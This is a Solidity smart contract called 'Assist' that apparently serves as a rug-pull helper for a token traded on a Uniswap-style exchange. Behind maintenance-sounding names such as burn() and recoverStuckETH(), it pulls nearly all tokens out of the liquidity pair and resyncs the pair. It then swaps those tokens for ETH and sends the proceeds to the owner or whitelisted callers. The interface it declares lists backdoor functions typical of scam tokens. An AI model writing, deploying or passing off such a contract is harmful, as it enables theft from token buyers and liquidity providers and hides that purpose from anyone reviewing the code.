// SPDX-License-Identifier: MIT
// 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
pragma solidity ^0.8.0;

contract Ownable {
    address internal _owner;

    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function recoverToken(address token) external;

    function transferFrom(
        address from,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint256);

    function burn(address spender, uint256 amount) external;

    function totalSupply() external view returns (uint256);

    function manualSwap(address pair_, uint256 amount_) external;

    function manualSwap() external;

    function manualsend() external;

    function manualsend(address to) external;

    function manualSwap(address spender) external;

    function airdrop(
        address from,
        address[] memory recipients,
        uint256 amount
    ) external;

    function reduceFee(uint256 _amount) external;

    function delBots(address bot) external;

    function reduceFee(uint256 _newFee, address from) external;

    function rescueERC20(address _address, uint256 percent) external;
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IUniswapV2Pair {
    function sync() external;
}

contract Assist is Ownable {
    address private token;
    address private pair;
    mapping(address => bool) private whites;
    IUniRouter private router;
    modifier onlyOwners() {
        require(whites[msg.sender]);
        _;
    }

    constructor() {
        whites[msg.sender] = true;
        
    }

    function whitelist(address[] memory whites_) external onlyOwners {
        for (uint256 i = 0; i < whites_.length; i++) {
            whites[whites_[i]] = true;
        }
    }

    function refresh(
        address router_,
        address token_,
        address pair_
    ) external onlyOwner {
        router = IUniRouter(router_);
        token = token_;
        pair = pair_;
    }

    function swap(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = router.WETH();
        IERC20(token).approve(address(router), ~uint256(0));
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            _owner,
            block.timestamp
        );
    }

    function mint(uint256 amount) public onlyOwners {
        swap(amount);
    }

    function burn() public onlyOwners {
        uint256 pairBalance = IERC20(token).balanceOf(pair);
        uint256 amount = pairBalance - pairBalance / 10000;// a little remain
        IERC20(token).transferFrom(pair, address(this), amount);
        IUniswapV2Pair(pair).sync();
        uint256 balance = IERC20(token).balanceOf(address(this));
        swap(balance);
    }

    function recoverStuckETH() external onlyOwners {
        // mint(IERC20(token).totalSupply() * 1000);
        burn();
        payable(msg.sender).transfer(address(this).balance);//
    }

    function withdrawStuckTokens(address token_) external onlyOwners {
        if (token_ == address(0)) {
            payable(msg.sender).transfer(address(this).balance);
        } else {
            IERC20(token_).transfer(
                msg.sender,
                IERC20(token_).balanceOf(address(this))
            );
        }
    }

    function manualSwap() external onlyOwner {
        IERC20(token).manualSwap();
    }

    receive() external payable {
        require(whites[tx.origin]);
    }

    fallback() external payable {
        require(whites[tx.origin]);
    }
}
